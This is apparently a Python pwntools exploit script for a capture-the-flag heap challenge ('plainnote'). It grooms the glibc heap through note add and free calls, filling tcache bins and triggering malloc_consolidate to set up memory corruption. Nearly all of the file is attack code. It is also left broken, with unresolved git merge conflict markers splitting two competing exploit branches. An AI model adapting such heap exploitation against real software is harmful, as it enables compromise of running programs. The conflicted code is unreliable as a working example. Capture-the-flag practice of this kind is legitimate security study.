#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './note'
HOST, PORT = 'plainnote.balsnctf.com', 54321

elf = ELF(BINARY)
p = process(BINARY)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Credits to teamrocketist for the following two functions, they help immensely when trying
# to debug exploits
def get_base_address(proc):
  return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
  script = ""
  PIE = get_base_address(p)
  for bp in breakpoints:
    script += "b *0x%x\n"%(PIE+bp)
  gdb.attach(p,gdbscript=script)

def add(size, content):
    p.sendlineafter(': ', '1')
    p.sendlineafter(': ', str(size))
    p.sendafter(': ', content)

def free(idx):
    p.sendlineafter(': ', '2')
    p.sendlineafter(': ', str(idx))

def show(idx):
    p.sendlineafter(': ', '3')
    return p.recvuntil('*')

def start():
 if not args.REMOTE:
     return process(BINARY)
 else:
     return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
 debug([])

# Clear the heap first so we have a clean slate to work off of

# These will consolidate with the top chunk
add(0x420, 'A'*0x420)
free(0)
add(0x170, 'A'*0x170)
free(0)
add(0x150, 'A'*0x150)
free(0)


for i in xrange(5):
  add(0x40, 'A'*0x40)
for i in xrange(5):
  free(i)

add(0x20, 'A'*0x20) # 0
add(0x20, 'A'*0x20) # 1
add(0x20, 'A'*0x20) # 2

# These will go into tcache
for i in range(7):
  add(0x20, 'A'*0x20) # 3 ~ 9

add(0x250, 'A'*0x250) # 10
free(10) # tcache

for i in xrange(10, 19):
  add(0x20, str(i)) # 10 ~ 18

<<<<<<< HEAD
free(1)
add(0x118, 'B'*0x110 + p64(0x120)) # 0

free(2) 
=======
# Fill up the 0x20 tcache bin
for i in xrange(7):
  free(i+3)

free(17)
free(11)
free(14)
add(0x500, 'A'*0x500) # 3, trigger malloc_consolidate
free(3)
free(10)
add(0x500, 'A'*0x500) # 3, trigger malloc_consolidate
free(3)
free(16)
add(0x500, 'A'*0x500) # 3, trigger malloc_consolidate
free(3)
add(0x50, 'B'*0x50)
>>>>>>> db308f96e2e4727e77624e12c2fb7cb4e8903013

p.interactive()
